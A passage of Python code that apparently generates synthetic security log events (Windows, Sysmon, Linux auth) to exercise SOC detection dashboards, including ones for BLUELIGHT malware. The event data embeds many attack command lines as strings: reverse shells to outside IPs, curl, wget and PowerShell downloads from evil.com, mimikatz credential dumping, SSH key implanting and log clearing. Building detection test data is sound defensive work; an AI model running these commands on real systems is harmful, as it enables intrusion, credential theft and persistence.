            msg=f"BLUELIGHT browser credential access: {ntpath.basename(browser)}",
            offset=base + 360 + i,
        ))

    return events


# ═══════════════════════════════════════════════════════════════════
#  Multicloudoperations-compatible Log Sources
# ═══════════════════════════════════════════════════════════════════

# Threat actor names used by multicloudoperations Campaign Tracker
THREAT_ACTORS = ["joffrey", "littlefinger", "arya", "daenerys", "sql_svc", "svc-devops"]
THREAT_ACTOR_EMAILS = [
    "joffrey.baratheon@sevenkingdoms.local",
    "arya.stark@sevenkingdoms.local",
]
SEVEN_KINGDOMS_HOSTS = [
    "DC01.sevenkingdoms.local", "SRV01.sevenkingdoms.local",
    "WS01.sevenkingdoms.local", "WS02.sevenkingdoms.local",
    "DB01.sevenkingdoms.local",
]
SEVEN_KINGDOMS_LINUX = [
    "web01.sevenkingdoms.local", "app01.sevenkingdoms.local",
    "db01.sevenkingdoms.local", "bastion.sevenkingdoms.local",
    "k8s-node01.sevenkingdoms.local",
]


def winsec_event(event_id, user=None, host=None, source_addr=None,
                 logon_type=None, process_name=None, command_line=None,
                 msg=None, offset=0):
    """Generate a Windows Security Event Log JSON entry via the canonical builder.

    Delegates to ``schemas.build_windows_security_event`` so the record matches
    the real Microsoft-Windows-Security-Auditing EVTX shape (Channel="Security",
    Provider, EventID, TimeCreated, Computer, native PascalCase fields like
    ``SubjectUserName``, ``SourceAddress``, ``LogonType``) plus parallel OCI Log
    Analytics display-name columns (``Event ID``, ``Source IP``, ``Logon Type``,
    ``Process Name``).
    """
    from schemas import build_windows_security_event

    if user is None:
        user = random.choice(THREAT_ACTORS)
    if host is None:
        host = random.choice(SEVEN_KINGDOMS_HOSTS)
    if source_addr is None:
        source_addr = random.choice(SUSPICIOUS_IPS + CORPORATE_IPS)

    event = build_windows_security_event(
        int(event_id),
        event_time=ts(offset),
        computer=host,
        user=user,
        subject_user_name=user,
        source_address=source_addr,
        logon_type=logon_type if logon_type is not None else "",
        process_name=process_name or "",
        new_process_name=process_name or "",
        command_line=command_line or "",
    )
    event["msg"] = msg or f"Windows Security Event {event_id}"
    # Legacy compatibility: existing detection queries expect these alias
    # spellings to be present even when the builder treats them as optional.
    event.setdefault("Process Name", process_name or "")
    event.setdefault("New Process Name", process_name or "")
    event.setdefault("Source IP", source_addr)
    event.setdefault("Source Address", source_addr)
    event.setdefault("Logon Type", str(logon_type) if logon_type else "")
    event.setdefault("Subject User Name", user)
    event.setdefault("CommandLine", command_line or "")
    event.setdefault("ProcessName", process_name or "")
    event.setdefault("LogonType", str(logon_type) if logon_type else "")
    event.setdefault("SourceAddress", source_addr)
    return event


def generate_windows_event_security():
    """Generate Windows Security Event Log events for multicloudoperations widgets."""
    events = []

    # ── Event 4625: Failed Logon (brute force) ──
    for i in range(25):
        actor = random.choice(THREAT_ACTORS + THREAT_ACTOR_EMAILS)
        events.append(winsec_event(
            4625, user=actor,
            source_addr=random.choice(SUSPICIOUS_IPS),
            logon_type=random.choice([3, 10]),
            msg="An account failed to log on.",
            offset=i,
        ))

    # ── Event 4624: Successful Logon ──
    for i in range(15):
        actor = random.choice(THREAT_ACTORS)
        lt = random.choice([2, 3, 10])
        events.append(winsec_event(
            4624, user=actor,
            source_addr=random.choice(CORPORATE_IPS + SUSPICIOUS_IPS),
            logon_type=lt,
            msg="An account was successfully logged on.",
            offset=100+i,
        ))

    # ── Event 4624 LogonType=10 (RDP) ──
    for i in range(8):
        events.append(winsec_event(
            4624, user=random.choice(THREAT_ACTORS),
            source_addr=random.choice(SUSPICIOUS_IPS),
            logon_type=10,
            msg="An account was successfully logged on.",
            offset=120+i,
        ))

    # ── Event 4672: Special Privileges Assigned ──
    for i in range(10):
        events.append(winsec_event(
            4672, user=random.choice(THREAT_ACTORS),
            msg="Special privileges assigned to new logon.",
            offset=200+i,
        ))

    # ── Event 4720: User Account Created ──
    for i in range(5):
        events.append(winsec_event(
            4720, user=random.choice(THREAT_ACTORS),
            msg="A user account was created.",
            offset=300+i,
        ))

    # ── Event 4698: Scheduled Task Created ──
    for i in range(4):
        events.append(winsec_event(
            4698, user=random.choice(THREAT_ACTORS),
            msg="A scheduled task was created.",
            offset=310+i,
        ))

    # ── Event 4728/4732/4756: Group Membership Changes ──
    group_events = [
        (4728, "A member was added to a security-enabled global group."),
        (4732, "A member was added to a security-enabled local group."),
        (4756, "A member was added to a security-enabled universal group."),
    ]
    for idx, (eid, msg_text) in enumerate(group_events):
        for i in range(3):
            events.append(winsec_event(
                eid, user=random.choice(THREAT_ACTORS),
                msg=msg_text, offset=320+idx*5+i,
            ))

    # ── Event 1102: Audit Log Cleared ──
    for i in range(4):
        events.append(winsec_event(
            1102, user=random.choice(THREAT_ACTORS),
            msg="The audit log was cleared.",
            offset=400+i,
        ))

    # ── Event 4688: Process Creation ──
    process_scenarios = [
        ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c whoami /all"),
        ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c schtasks /create /sc minute /mo 5 /tn EvilTask /tr C:\\Temp\\payload.exe"),
        ("C:\\Windows\\System32\\powershell.exe", "powershell.exe -c Invoke-WebRequest -Uri http://evil.com/payload.exe -OutFile C:\\Temp\\payload.exe"),
        ("C:\\Windows\\System32\\powershell.exe", "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA="),
        ("C:\\Temp\\mimikatz.exe", "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"),
        ("C:\\Windows\\System32\\powershell.exe", "powershell.exe Invoke-BloodHound -CollectionMethod All"),
    ]
    for i, (proc, command_line) in enumerate(process_scenarios):
        events.append(winsec_event(
            4688, user=random.choice(THREAT_ACTORS),
            process_name=proc,
            command_line=command_line,
            msg=f"A new process has been created: {command_line}",
            offset=500+i,
        ))

    bluelight_obfuscated = [
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -NoProfile -Command [Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsA')"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA=="),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQ"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -Command [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('payload'))"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -Command $key=0xCF; $b=[byte[]](1..10); ($b | ForEach-Object { $_ -bxor $key })"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -Command iex(New-Object Net.WebClient).DownloadString('http://203.0.113.10/p.ps1')"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -Command Invoke-Expression (Get-Content C:\\Users\\Public\\stage.ps1 -Raw)"),
        ("C:\\Windows\\System32\\wscript.exe",
         "wscript.exe C:\\Users\\Public\\loader.vbs char(72) char(101) char(108) XOR 0xCF"),
        ("C:\\Windows\\System32\\mshta.exe",
         "mshta.exe javascript:eval(unescape('%76%61%72%20%62%3D%22%4F%22'))"),
        ("C:\\Windows\\System32\\cscript.exe",
         "cscript.exe //e:vbs C:\\Users\\Public\\dropper.vbs FromBase64String"),
    ]
    for i, (proc, command_line) in enumerate(bluelight_obfuscated):
        events.append(winsec_event(
            4688, user="joffrey",
            host="WS01.sevenkingdoms.local",
            process_name=proc,
            command_line=command_line,
            msg="BLUELIGHT obfuscated script execution",
            offset=520 + i,
        ))

    # ── Event 4946/4947: Firewall Rule Changes ──
    for i in range(3):
        events.append(winsec_event(
            4946, user=random.choice(THREAT_ACTORS),
            msg="A change has been made to Windows Firewall exception list. A rule was added.",
            offset=600+i,
        ))
    for i in range(2):
        events.append(winsec_event(
            4947, user=random.choice(THREAT_ACTORS),
            msg="A change has been made to Windows Firewall exception list. A rule was modified.",
            offset=610+i,
        ))

    # ── Event 4656/4663: Object Access ──
    for i in range(4):
        events.append(winsec_event(
            4656, user=random.choice(THREAT_ACTORS),
            msg="A handle to an object was requested.",
            offset=700+i,
        ))
    for i in range(4):
        events.append(winsec_event(
            4663, user=random.choice(THREAT_ACTORS),
            msg="An attempt was made to access an object.",
            offset=710+i,
        ))

    return events


def winsys_event(event_id, host=None, service_name=None, user=None,
                 msg=None, offset=0):
    """Generate a Windows System Event Log JSON entry.

    Uses OCI Log Analytics field names for query compatibility.
    """
    if host is None:
        host = random.choice(SEVEN_KINGDOMS_HOSTS)
    if user is None:
        user = random.choice(["SYSTEM", "LOCAL SERVICE"] + THREAT_ACTORS)
    return {
        # OCI Log Analytics mapped fields
        "Event ID": int(event_id),
        "Host Name (Server)": host,
        "Service Name": service_name or "",
        # Native fields
        "EventID": str(event_id),
        "TimeCreated": ts(offset),
        "Computer": host,
        "Channel": "System",
        "Provider": "Service Control Manager",
        "ServiceName": service_name or "",
        "User": user,
        "msg": msg or f"Windows System Event {event_id}",
    }


def generate_windows_event_system():
    """Generate Windows System Event Log events for multicloudoperations widgets."""
    events = []

    # ── Event 7045: New Service Installed ──
    malicious_services = [
        ("backdoor_svc", "C:\\Temp\\backdoor.exe"),
        ("evil_agent", "C:\\Windows\\Temp\\agent.exe"),
        ("update_service", "C:\\Users\\Public\\updater.exe"),
        ("cobaltstrike", "C:\\ProgramData\\beacon.exe"),
        ("persistence_svc", "powershell.exe -ep bypass -f C:\\Temp\\payload.ps1"),
    ]
    for i, (svc_name, svc_path) in enumerate(malicious_services):
        for j in range(3):
            events.append(winsys_event(
                7045,
                service_name=svc_name,
                user=random.choice(THREAT_ACTORS + ["SYSTEM"]),
                msg=f"A service was installed in the system. Service Name: {svc_name} Service File Name: {svc_path}",
                offset=i*5+j,
            ))

    # ── Event 7036: Service State Changes ──
    for i in range(5):
        events.append(winsys_event(
            7036,
            service_name=random.choice([s[0] for s in malicious_services]),
            msg="The service entered the running state.",
            offset=100+i,
        ))

    return events


def linux_secure_event(process, message, host=None, user=None,
                       source_ip=None, auth_method=None, facility="auth",
                       severity="info", offset=0):
    """Generate a Linux Secure/Auth log JSON entry for the Linux Secure Logs source."""
    if host is None:
        host = random.choice(SEVEN_KINGDOMS_LINUX)
    if user is None:
        user = random.choice(THREAT_ACTORS)
    return {
        "EndpointOS": "Linux",
        "Timestamp": ts(offset),
        "Hostname": host,
        "Process": process,
        "PID": random.randint(100, 65535),
        "Facility": facility,
        "Severity": severity,
        "msg": message,
        # ``Command Line`` is required by detection queries that look for
        # specific argv shapes (crontab -e, sudo flags, etc.). Mirror the
        # syslog message into the Command Line column so those queries
        # match without the parser having to guess from raw msg.
        "CommandLine": message,
        "Command Line": message,
        "SourceIP": source_ip or random.choice(SUSPICIOUS_IPS),
        "User": user,
        "AuthMethod": auth_method or "password",
        "SessionType": "ssh" if process == "sshd" else "local",
    }


def generate_linux_secure():
    """Generate Linux Secure log events for multicloudoperations widgets."""
    events = []

    # ── SSH Failed Password ──
    for i in range(20):
        actor = random.choice(THREAT_ACTORS + THREAT_ACTOR_EMAILS)
        src_ip = random.choice(SUSPICIOUS_IPS)
        events.append(linux_secure_event(
            "sshd",
            f"Failed password for {actor} from {src_ip} port {random.randint(40000,65535)} ssh2",
            user=actor, source_ip=src_ip,
            offset=i,
        ))

    # ── SSH Invalid User ──
    for i in range(10):
        src_ip = random.choice(SUSPICIOUS_IPS)
        events.append(linux_secure_event(
            "sshd",
            f"Invalid user {random.choice(THREAT_ACTORS)} from {src_ip} port {random.randint(40000,65535)}",
            source_ip=src_ip,
            offset=30+i,
        ))

    # ── SSH authentication failure ──
    for i in range(8):
        src_ip = random.choice(SUSPICIOUS_IPS)
        events.append(linux_secure_event(
            "sshd",
            f"pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={src_ip}",
            source_ip=src_ip,
            offset=50+i,
        ))

    # ── Sudo failures ──
    for i in range(8):
        actor = random.choice(THREAT_ACTORS)
        events.append(linux_secure_event(
            "sudo",
            f"{actor} : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/{actor} ; USER=root ; COMMAND=/bin/bash",
            user=actor,
            offset=100+i,
        ))

    # ── Sudo NOT in sudoers ──
    for i in range(5):
        actor = random.choice(THREAT_ACTORS)
        events.append(linux_secure_event(
            "sudo",
            f"{actor} : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/{actor} ; USER=root ; COMMAND=/bin/su",
            user=actor,
            offset=120+i,
        ))

    # ── Sudo success ──
    for i in range(10):
        actor = random.choice(THREAT_ACTORS)
        events.append(linux_secure_event(
            "sudo",
            f"{actor} : TTY=pts/{i} ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash",
            user=actor,
            offset=130+i,
        ))

    # ── useradd / adduser: New account creation ──
    for i in range(5):
        events.append(linux_secure_event(
            "useradd",
            f"new user: name=backdoor{i}, UID=100{i}, GID=100{i}, home=/home/backdoor{i}, shell=/bin/bash",
            user=random.choice(THREAT_ACTORS),
            offset=200+i,
        ))
    for i in range(3):
        events.append(linux_secure_event(
            "adduser",
            f"new user: name=evil{i}, UID=200{i}, GID=200{i}, home=/home/evil{i}, shell=/bin/bash",
            user=random.choice(THREAT_ACTORS),
            offset=210+i,
        ))

    # ── passwd: Password changes ──
    for i in range(4):
        actor = random.choice(THREAT_ACTORS)
        events.append(linux_secure_event(
            "passwd",
            f"pam_unix(passwd:chauthtok): password changed for {actor}",
            user=actor,
            offset=220+i,
        ))

    # ── Crontab modification (T1053.003) ──
    # Detection queries also LIKE the Command Line for ``-e`` / ``-r`` /
    # ``/tmp/`` / ``/var/tmp/`` / ``/dev/shm/`` patterns indicative of
    # interactive editing or scripted persistence drops. Emit explicit
    # variants so the SOC: Linux Security widget matches.
    crontab_argv = [
        "crontab -e",
        "crontab -r",
        "crontab -e /tmp/payload.cron",
        "crontab -e /var/tmp/persist.cron",
        "crontab -l > /dev/shm/cronbackup",
        "crontab /tmp/.hidden-cron",
    ]
    for i, argv in enumerate(crontab_argv):
        actor = random.choice(THREAT_ACTORS)
        events.append(linux_secure_event(
            "crontab",
            f"({actor}) CMD ({argv})",
            user=actor, facility="cron",
            offset=295+i,
        ))
    for i in range(6):
        actor = random.choice(THREAT_ACTORS)
        events.append(linux_secure_event(
            "crontab",
            f"({actor}) REPLACE ({actor}) crontab",
            user=actor, facility="cron",
            offset=300+i,
        ))
    for i in range(3):
        events.append(linux_secure_event(
            "crond",
            f"(root) REPLACE (root) crontab",
            user="root", facility="cron",
            offset=310+i,
        ))

    # ── systemctl enable (T1543.002) ──
    for i in range(4):
        events.append(linux_secure_event(
            "systemctl",
            f"enable evil-service-{i}.service",
            user=random.choice(THREAT_ACTORS),
            offset=320+i,
        ))

    # ── authorized_keys modification (T1098.004) ──
    for i in range(5):
        actor = random.choice(THREAT_ACTORS)
        events.append(linux_secure_event(
            "sshd",
            f"Accepted publickey for {actor} from {random.choice(SUSPICIOUS_IPS)} port 22 ssh2: RSA SHA256:AAAA",
            user=actor, auth_method="publickey",
            offset=400+i,
        ))
    for i in range(4):
        events.append(linux_secure_event(
            "bash",
            f"echo 'ssh-rsa AAAA... attacker@evil' >> /home/{random.choice(THREAT_ACTORS)}/.ssh/authorized_keys",
            facility="syslog",
            offset=410+i,
        ))

    # ── History clearing (T1070.003) ──
    history_cmds = [
        "history -c", "rm -f ~/.bash_history",
        "unset HISTFILE", "export HISTSIZE=0",
        "cat /dev/null > ~/.bash_history",
    ]
    for i, cmd in enumerate(history_cmds):
        events.append(linux_secure_event(
            "bash", cmd,
            user=random.choice(THREAT_ACTORS),
            facility="syslog",
            offset=500+i,
        ))

    # ── Defense evasion: chmod +s, /etc/shadow, /etc/passwd ──
    evasion_cmds = [
        "chmod +s /tmp/exploit",
        "chmod u+s /usr/local/bin/backdoor",
        "chmod 777 /etc/shadow",
        "chmod 666 /etc/passwd",
    ]
    for i, cmd in enumerate(evasion_cmds):
        events.append(linux_secure_event(
            "bash", cmd,
            user=random.choice(THREAT_ACTORS),
            facility="syslog",
            offset=510+i,
        ))

    # ── Execution: curl/wget/nc/python/perl/bash ──
    exec_cmds = [
        ("curl", "curl -o /tmp/payload http://evil.com/malware"),
        ("wget", "wget http://evil.com/backdoor -O /tmp/bd"),
        ("python", "python -c 'import pty;pty.spawn(\"/bin/sh\")'"),
        ("perl", "perl -e 'exec \"/bin/sh\"'"),
    ]
    for i, (proc, cmd) in enumerate(exec_cmds):
        events.append(linux_secure_event(
            proc, cmd,
            user=random.choice(THREAT_ACTORS),
            facility="syslog",
            offset=600+i,
        ))

    # ── Reverse shell patterns ──
    shells = [
        "bash -i >& /dev/tcp/185.215.113.206/4444 0>&1",
        "nc -e /bin/sh 103.253.41.45 8080",
        "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"185.215.113.206\",4444));'",
        "mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 5.252.178.48 443 >/tmp/f",
    ]
    for i, shell in enumerate(shells):
        events.append(linux_secure_event(
            "bash", shell,
            user=random.choice(THREAT_ACTORS),
            facility="syslog",
            offset=700+i,
        ))

    # ── Network defense evasion: iptables/ufw ──
    net_cmds = [
        ("iptables", "iptables -F"),
        ("iptables", "iptables -A INPUT -p tcp --dport 4444 -j ACCEPT"),
        ("ufw", "ufw disable"),
    ]
    for i, (proc, cmd) in enumerate(net_cmds):
        events.append(linux_secure_event(
            proc, cmd,
            user=random.choice(THREAT_ACTORS),
            facility="syslog",
            offset=800+i,
        ))

    # ── Credential access: /proc/kcore, /dev/mem ──
    cred_cmds = [
        "cat /proc/kcore > /tmp/memory.dmp",
        "dd if=/dev/mem of=/tmp/mem.dmp bs=1M count=10",
    ]
    for i, cmd in enumerate(cred_cmds):
        events.append(linux_secure_event(
            "bash", cmd,
            user=random.choice(THREAT_ACTORS),
            facility="syslog",
            offset=900+i,
        ))

    return events


def sysmon_op_event(event_id, host=None, user=None, source_image=None,
                    target_image=None, command_line=None,
                    dest_hostname=None, dest_ip=None, dest_port=None,
                    query_name=None, query_results=None,
                    pipe_name=None, target_filename=None,
                    target_object=None, parent_image=None,
                    granted_access=None, msg=None, offset=0):
    """Generate a Sysmon Operational JSON entry via the canonical builder.

    Delegates to ``schemas.build_windows_sysmon_event`` so the record matches
    the real Microsoft-Windows-Sysmon/Operational EVTX shape (Channel,
    Provider, native PascalCase fields ``Image``, ``CommandLine``,
    ``ParentImage``, ``TargetImage``, ``PipeName``, ``QueryName``,
    ``DestinationIp``, ``GrantedAccess``) plus the parallel OCI Log Analytics
    display-name columns (``Process Name``, ``Source Process``, ``Target
    Process``, ``Granted Access``, ``Target Object``).

    The detections layer keeps the ``Source Process``/``Target Process``
    aliases that the BLUELIGHT and Sysmon-Operational queries reference even
    when the canonical builder treats them as optional.
    """
    from schemas import build_windows_sysmon_event

    if host is None:
        host = random.choice(SEVEN_KINGDOMS_HOSTS)
    if user is None:
        user = random.choice(THREAT_ACTORS)

    image = source_image or target_image or ""
    event = build_windows_sysmon_event(
        int(event_id),
        event_time=ts(offset),
        computer=host,
        user=user,
        image=image,
        command_line=command_line or "",
        parent_image=parent_image or source_image or "",
        target_image=target_image or "",
        source_image=source_image or "",
        pipe_name=pipe_name or "",
        query_name=query_name or "",
        query_results=query_results or "",
        target_filename=target_filename or "",
        destination_ip=dest_ip or "",
        destination_port=dest_port or "",
        granted_access=granted_access or "",
    )
    # Operational-channel override — the SOC source registered in
    # ``setup_log_sources.py`` keys on this Channel.
    event["Channel"] = "Microsoft-Windows-Sysmon/Operational"
    event["log_source_identifier"] = "Windows Sysmon Operational Logs"
    event["Log Source"] = "Windows Sysmon Operational Logs"
    # Detection-layer aliases the BLUELIGHT widgets and Sysmon Operational
    # parser rely on; keep them populated even when empty so projection
    # against ``'Source Process'`` etc. resolves cleanly.
    event["Source Process"] = source_image or ""
    event["Target Process"] = target_image or ""
    event["Process Name"] = image
    event["Parent Process Name"] = parent_image or source_image or ""
    event["Command Line"] = command_line or ""
    event["Destination Hostname"] = dest_hostname or ""
    event["Destination IP"] = dest_ip or ""
    event["Destination Port"] = str(dest_port) if dest_port else ""
    event["Source IP"] = ""
    event["Query Name"] = query_name or ""
    event["Query Results"] = query_results or ""
    event["Pipe Name"] = pipe_name or ""
    event["Target Filename"] = target_filename or ""
    event["Target Object"] = target_object or ""
    event["Granted Access"] = granted_access or ""
    # Native field aliases for parser fall-back paths.
    event["EndpointOS"] = "Windows"
    event["EventID"] = str(event_id)
    event["DestinationHostname"] = dest_hostname or ""
    event["DestinationIp"] = dest_ip or ""
    event["DestinationPort"] = str(dest_port) if dest_port else ""
    event["QueryName"] = query_name or ""
    event["QueryResults"] = query_results or ""
    event["PipeName"] = pipe_name or ""
    event["TargetFilename"] = target_filename or ""
    event["TargetObject"] = target_object or ""
    event["ParentImage"] = parent_image or source_image or ""
    event["SourceImage"] = source_image or ""
    event["TargetImage"] = target_image or ""
    event["CommandLine"] = command_line or ""
    event["GrantedAccess"] = granted_access or ""
    event["msg"] = msg or f"Sysmon Event {event_id}"
    return event


def _bluelight_kill_chain_sysmon_op_events():
    """Emit BLUELIGHT (S0657 / APT37) IOCs covering every per-widget detection.

    Volexity research: https://www.volexity.com/blog/2021/08/17/north-korean-bluelight-special/
    Each block targets a specific detection rule under queries/bluelight_*.json so
    that all dashboard widgets return rows when this dataset is ingested.
    """
    events = []
    apt_host = "WS01.sevenkingdoms.local"
    apt_user = "joffrey"
    apt_image = "C:\\Users\\Public\\bluelight.exe"
    iexplore = "C:\\Program Files\\Internet Explorer\\iexplore.exe"
    powershell = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    cmd = "C:\\Windows\\System32\\cmd.exe"
    rundll32 = "C:\\Windows\\System32\\rundll32.exe"

    base = 1000

    file_discovery_cmds = [
        ("dir /s /b C:\\Users\\joffrey\\Documents", iexplore, cmd),
        ("dir /s C:\\Users\\joffrey\\Desktop\\*.docx", iexplore, cmd),
        ("powershell -Command Get-ChildItem -Recurse -Path C:\\Users -Filter *.pdf",
         iexplore, powershell),
        ("tree C:\\Users\\joffrey /F", "C:\\Windows\\System32\\wscript.exe", cmd),
    ]
    for i, (cl, parent, image) in enumerate(file_discovery_cmds):
        events.append(sysmon_op_event(
            1,
            host=apt_host, user=apt_user,
            source_image=image, parent_image=parent,
            command_line=cl,
            msg="BLUELIGHT: file discovery from browser child",
            offset=base + i,
        ))

    sec_paths = [
        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend",
        "HKLM\\SOFTWARE\\Microsoft\\Security Center\\SecurityCenter2",
        "HKLM\\SOFTWARE\\Windows Defender\\Exclusions",
        "HKLM\\SOFTWARE\\AVAST Software\\Avast",
        "HKLM\\SOFTWARE\\ESET\\ESET Security",
        "HKLM\\SOFTWARE\\KasperskyLab\\AVP",
    ]
    for i, target in enumerate(sec_paths):
        events.append(sysmon_op_event(
            12 + (i % 3),
            host=apt_host, user=apt_user,
            source_image=apt_image, parent_image=apt_image,
            target_object=target,
            msg="BLUELIGHT: registry enumeration of security products",
            offset=base + 50 + i,
        ))

    yara_pdb_cmds = [
        "C:\\Development\\BACKDOOR\\ncov\\Release\\bluelight.pdb",
        "powershell -Command Get-Content C:\\Users\\Public\\Release\\bluelight.pdb",
    ]
    for i, cl in enumerate(yara_pdb_cmds):
        events.append(sysmon_op_event(
            1,
            host=apt_host, user=apt_user,
            source_image=apt_image, parent_image=cmd,
            command_line=cl,
            msg="BLUELIGHT YARA: PDB path indicator",
            offset=base + 100 + i,
        ))
    events.append(sysmon_op_event(
        11,
        host=apt_host, user=apt_user,
        source_image=apt_image, parent_image=apt_image,
        target_filename="C:\\Users\\Public\\BACKDOOR\\ncov\\bluelight.pdb",
        msg="BLUELIGHT YARA: PDB file write",
        offset=base + 110,
    ))

    yara_recon_cmds = [
        'curl https://ipinfo.io/json',
        'powershell -Command Invoke-WebRequest -Uri https://ipinfo.io',
        'cmd /c echo {"UserName":"joffrey","ComName":"WS01","OnlineIP":"203.0.113.10","LocalIP":"10.0.1.10","AntiVirus":"Windows Defender","Process Level":"Medium","VM":"false"}',
    ]
    for i, cl in enumerate(yara_recon_cmds):
        events.append(sysmon_op_event(
            1,
            host=apt_host, user=apt_user,
            source_image=apt_image if i == 2 else powershell,
            parent_image=apt_image,
            command_line=cl,
            msg="BLUELIGHT YARA: system reconnaissance JSON",
            offset=base + 130 + i,
        ))

    yara_cookie_cmds = [
        'powershell -Command "cookie_name: OSID, cookie_name: SID, __Secure-3PSID"',
        'cmd /c echo cookie_name: __Secure-3PSID',
        'powershell -Command "Failed to get chrome cookie"',
        'powershell -Command "Failed to get Edge cookie database"',
        'cmd /c echo GM_ACTION_TOKEN=abc GM_ID_KEY=xyz',
        'cmd /c echo mail/u/0/?ik=abc Success to enable imap',
        'cmd /c echo Success to enable thunder access',
    ]
    for i, cl in enumerate(yara_cookie_cmds):
        events.append(sysmon_op_event(
            1,
            host=apt_host, user=apt_user,
            source_image=apt_image, parent_image=apt_image,
            command_line=cl,
            msg="BLUELIGHT YARA: chrome/edge cookie theft",
            offset=base + 150 + i,
        ))

    keylog_files = [
        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\cheV01.dat", "BLUELIGHT YARA: keylog cheV01"),
        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\INTEG.RAW", "BLUELIGHT YARA: keylog INTEG.RAW"),
        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\keylog.dat", "BLUELIGHT YARA: keylog dat"),
        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\keylog.log", "BLUELIGHT YARA: keylog log"),
        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\edb.chk", "BLUELIGHT YARA: edb.chk"),
        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\edb.log", "BLUELIGHT YARA: edb.log"),
        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\edbres00001.jrs", "BLUELIGHT YARA: edbres jrs"),
        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\edbres00002.jrs", "BLUELIGHT YARA: edbres jrs"),
        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\edbtmp.log", "BLUELIGHT YARA: edbtmp.log"),
    ]
    for i, (path, msg) in enumerate(keylog_files):
        events.append(sysmon_op_event(
            11,
            host=apt_host, user=apt_user,
            source_image=apt_image, parent_image=apt_image,
            target_filename=path,
            msg=msg,
            offset=base + 200 + i,
        ))

    yara_google_cmds = [
        'cmd /c echo Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5',
        'cmd /c echo User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:80.0) Gecko/20100101 Firefox/80.0',
        'cmd /c echo AccountSettingsUi/data/batchexecute SNlM0e BqLdsd token',
    ]
    for i, cl in enumerate(yara_google_cmds):
        events.append(sysmon_op_event(
            1,
            host=apt_host, user=apt_user,
            source_image=apt_image, parent_image=apt_image,
            command_line=cl,
            msg="BLUELIGHT YARA: Google App C2 indicator",
            offset=base + 230 + i,
        ))

    ingress_files = [
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\stage2.exe",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\loader.dll",
        "C:\\Users\\Public\\AppData\\Roaming\\update.scr",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\runner.bat",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\stager.ps1",
    ]
    for i, path in enumerate(ingress_files):
        events.append(sysmon_op_event(
            11,
            host=apt_host, user=apt_user,
            source_image=apt_image, parent_image=apt_image,
            target_filename=path,
            msg=f"BLUELIGHT: ingress tool transfer ({path.split(chr(92))[-1]})",
            offset=base + 260 + i,
        ))

    wmi_cmds = [
        "powershell -Command Get-WmiObject -Class Win32_ComputerSystem",
        "powershell -Command Get-CimInstance -ClassName Win32_OperatingSystem",
        "wmic.exe path Win32_Processor get Name",
        "wmic.exe path Win32_NetworkAdapterConfiguration get IPAddress",
    ]
    for i, cl in enumerate(wmi_cmds):
        events.append(sysmon_op_event(
            1,
            host=apt_host, user=apt_user,
            source_image=powershell if "powershell" in cl else "C:\\Windows\\System32\\wbem\\wmic.exe",
            parent_image=iexplore,
            command_line=cl,
            msg="BLUELIGHT: WMI system enumeration from browser child",
            offset=base + 300 + i,
        ))

    child_proc_set = [
        ("cmd.exe /c whoami", cmd),
        ("powershell.exe -NoProfile -Command Get-Process", powershell),
        ("wscript.exe C:\\Users\\Public\\loader.vbs", "C:\\Windows\\System32\\wscript.exe"),
        ("mshta.exe http://203.0.113.20/payload.hta", "C:\\Windows\\System32\\mshta.exe"),
        ("cscript.exe //e:vbs C:\\Users\\Public\\dropper.vbs", "C:\\Windows\\System32\\cscript.exe"),
        ("rundll32.exe C:\\Users\\Public\\stage.dll,RunMain", rundll32),
    ]
    for i, (cl, image) in enumerate(child_proc_set):
        events.append(sysmon_op_event(
            1,
            host=apt_host, user=apt_user,
            source_image=image, parent_image=iexplore,
            command_line=cl,
            msg="BLUELIGHT: browser spawning suspicious child process",
            offset=base + 330 + i,
        ))

    return events


def generate_sysmon_operational():
    """Generate Sysmon Operational events for multicloudoperations widgets."""
    events = []

    # ── Event 1: Process Creation ──
    procs = [
        ("C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
